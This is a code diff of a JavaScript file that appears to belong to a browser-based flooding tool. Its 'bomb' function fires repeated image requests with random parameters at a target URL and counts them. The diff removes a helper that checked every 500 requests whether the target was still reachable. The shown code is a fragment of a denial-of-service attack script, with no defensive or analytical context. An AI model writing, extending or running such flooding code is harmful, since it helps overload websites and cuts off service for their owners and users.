@@ -3,18 +3,6 @@
 	let targets = {};
 	const intervals = {};
 
-	const statusCheck = async (url, bombTarget) => {
-		console.log('start check !!!!!')
-		
-		const response = await fetch(bombTarget);
-
-		if (response.ok) {
-			targets[bombTarget].status = 'avaliable';
-		} else {
-			targets[bombTarget].status = response.status;
-		}
-	}
-
 
 	const bomb = (bombTarget) => {
 		const rand = Math.floor(Math.random() * 1000);
@@ -33,10 +21,6 @@
 		
 		image.src = url;
 		targets[bombTarget].requested += 1;
-
-		if (targets[bombTarget].requested % 500 === 0) {
-			statusCheck(url, bombTarget);
-		}
 	}
 
 	
